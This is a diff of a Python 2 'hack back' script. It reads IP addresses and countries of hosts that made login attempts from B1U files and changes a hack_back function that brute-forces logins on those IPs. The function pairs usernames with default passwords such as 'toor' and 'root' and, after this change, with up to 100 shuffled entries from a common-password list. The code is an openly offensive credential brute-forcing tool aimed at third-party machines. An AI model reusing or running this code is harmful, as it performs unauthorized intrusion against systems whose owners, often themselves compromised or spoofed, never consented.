@@ -45,7 +45,7 @@ def load_countries():
 
 def pull_rogue_ip_list():
     counter = {}
-    for line in swap(base+'/OSINT/unique.txt', False):
+    for line in swap(base+'/B1U/unique.txt', False):
         ip = line.split(' : ')[0]
         try:
             login_attempts = line.split(' : ')[1]
@@ -65,8 +65,8 @@ def retrieve_unauthorized_origins():
     for country, code in c_codes.iteritems():
         counts[code] = 0
         countries[c_codes[country]] = []
-    if os.path.isfile(base+'/OSINT/locales.txt'):
-        for line in swap(base+'/OSINT/locales.txt', False):
+    if os.path.isfile(base+'/B1U/locales.txt'):
+        for line in swap(base+'/B1U/locales.txt', False):
             ip = line.split(' : ')[0]
             country = line.split(' : ')[1]
             counts[country] += 1
@@ -126,12 +126,14 @@ def hack_back(ip, determined):
     start = time.time()
     connected = False
     common = ['admin', 'default', 'password', 'password123', 'toor', 'root']
+    additional_words = list(set(swap('common_passwords.txt', False)))
     if determined:
-        for entry in list(set(swap('common_passwords.txt', False))):
+        for entry in additional_words:
             common.append(entry)   # random.shuffle(common
     else:
-        for entry in swap('common_passwords.txt', False)[0:40]:
-            common.append(entry)
+        random.shuffle(additional_words)
+        for word in additional_words[0:100]:
+            common.append(word)
     print '... Bruteforcing %s' % ip
     for u in names:
         for pw in common:
